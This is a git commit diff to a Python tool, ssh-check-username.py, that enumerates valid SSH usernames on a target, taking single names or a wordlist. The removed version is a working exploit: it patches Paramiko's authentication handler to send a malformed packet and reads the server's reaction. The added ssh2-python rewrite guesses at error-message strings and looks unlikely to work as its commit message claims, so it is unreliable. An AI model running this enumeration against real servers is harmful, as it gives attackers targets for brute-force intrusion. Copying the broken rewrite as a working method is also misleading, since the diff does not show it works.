5939bd70a894258154bbab4fbf0c2361f06df9d5
Will <34338536+W-GOULD@users.noreply.github.com>
2023-03-21 20:04:02 +0000

    Update ssh-check-username.py
    Paramiko library has undergone significant changes, and the original approach is no longer be valid. Here's an updated version of the code using the ssh2-python library. 
    you need to install the ssh2-python library. You can do this by running:
    pip install ssh2-python

--- ssh-check-username.py
+++ ssh-check-username.py
@@ -1,87 +1,49 @@
 #!/usr/bin/python3
-import multiprocessing
-import threading
-import time
-import os
 import argparse
-import logging
-import paramiko
+import multiprocessing
 import socket
-import sys
-import pdb
+from ssh2.session import Session
 
 arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('-t',dest='hostname', type=str, help='Single target')
-arg_parser.add_argument('-p',dest='port', type=int, default=22, help='port to connect on: Default port is 22')
-arg_parser.add_argument('-u',dest='username', type=str, help='username you want to enumerate')
-arg_parser.add_argument('-w',dest='wordlist', help='enumerate multiple users')
+arg_parser.add_argument('-t', dest='hostname', type=str, help='Single target')
+arg_parser.add_argument('-p', dest='port', type=int, default=22, help='port to connect on: Default port is 22')
+arg_parser.add_argument('-u', dest='username', type=str, help='username you want to enumerate')
+arg_parser.add_argument('-w', dest='wordlist', help='enumerate multiple users')
 args = arg_parser.parse_args()
 port = args.port
 target = args.hostname
 
-class InvalidUsername(Exception):
-    pass
+def ssh_user_enum(username, *args, **kwargs):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(5)
 
-
-def add_boolean(*args, **kwargs):
-    pass
-
-
-old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
-        paramiko.common.MSG_SERVICE_ACCEPT]
-
-def service_accept(*args, **kwargs):
-    paramiko.message.Message.add_boolean = add_boolean
-    return old_service_accept(*args, **kwargs)
-
-
-def userauth_failure(*args, **kwargs):
-    raise InvalidUsername()
-
-
-def _paramiko_tunnel(username, *args, **kwargs):
-    sock = socket.socket()
-    sock.connect((target, port))
-    us = username.strip()
     try:
-        transport = paramiko.transport.Transport(sock)
+        sock.connect((target, port))
     except socket.error:
-        print ('[-] Failed to connect')
+        print('[-] Failed to connect')
         return
+
+    session = Session()
+    session.handshake(sock)
+
     try:
-        transport.start_client()
-    except paramiko.ssh_exception.SSHException:
-        print ('[-] Failed to negotiate SSH transport')
-        return
-    try:
-        transport.auth_publickey(us, paramiko.RSAKey.generate(2048))
-    except InvalidUsername:
-        print ('[*] {} - Invalid username'.format(us))
-    except paramiko.ssh_exception.AuthenticationException:
-        print ('[+] {} - Valid username'.format(us))
-        return
+        session.userauth_publickey_frommemory(username, b'')
+    except Exception as e:
+        if 'Invalid key' in str(e):
+            print('[*] {} - Invalid username'.format(username))
+        elif 'Authentication failed' in str(e):
+            print('[+] {} - Valid username'.format(username))
 
-
-paramiko.auth_handler.AuthHandler._handler_table.update({
-    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
-    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
-})
-
-logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
+    sock.close()
 
 if args.username is not None:
     username = args.username
-    _paramiko_tunnel(target, port, username)
+    ssh_user_enum(username)
 
 if args.wordlist is not None:
     usernames = []
-    mp = []
     pool = multiprocessing.Pool(5)
     with open(args.wordlist) as f:
         for u in f:
-            usernames.append(u)
-        pool.map(_paramiko_tunnel, usernames)
-
-        
-
-
+            usernames.append(u.strip())
+    pool.map(ssh_user_enum, usernames)
